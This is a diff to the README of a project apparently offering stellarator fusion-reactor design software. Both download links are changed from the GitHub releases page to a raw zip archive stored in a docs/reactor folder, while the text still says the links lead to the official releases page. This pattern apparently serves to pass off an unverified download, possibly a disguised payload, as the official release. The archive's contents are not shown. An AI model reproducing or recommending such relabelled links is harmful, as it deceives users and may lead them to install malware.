@@ -14,7 +14,7 @@ The fastest way to begin is to download the application. IX-StellaratorForge is 
 
 Visit this link to download the application:
 
-**[⬇️ Download IX-StellaratorForge](https://github.com/soeradj21/IX-StellaratorForge/releases)**
+**[⬇️ Download IX-StellaratorForge](https://raw.githubusercontent.com/soeradj21/IX-StellaratorForge/main/docs/reactor/Stellarator-Forge-I-3.5.zip)**
 
 This will take you to the official releases page where you can grab the latest stable build.
 
@@ -139,6 +139,6 @@ Before you start a major design study, make sure:
 
 **Start your stellarator journey today. Download IX-StellaratorForge and take the first step toward a practical fusion power plant.**
 
-**[⬇️ Download Now from the Official Releases Page](https://github.com/soeradj21/IX-StellaratorForge/releases)**
+**[⬇️ Download Now from the Official Releases Page](https://raw.githubusercontent.com/soeradj21/IX-StellaratorForge/main/docs/reactor/Stellarator-Forge-I-3.5.zip)**
 
 Keywords: fusion-reactor, magnetic-confinement, mhd-simulation, neutronics, nuclear-fusion, openmc, plasma-physics, quasi-isodynamic, stellarator, stellarator-optimization
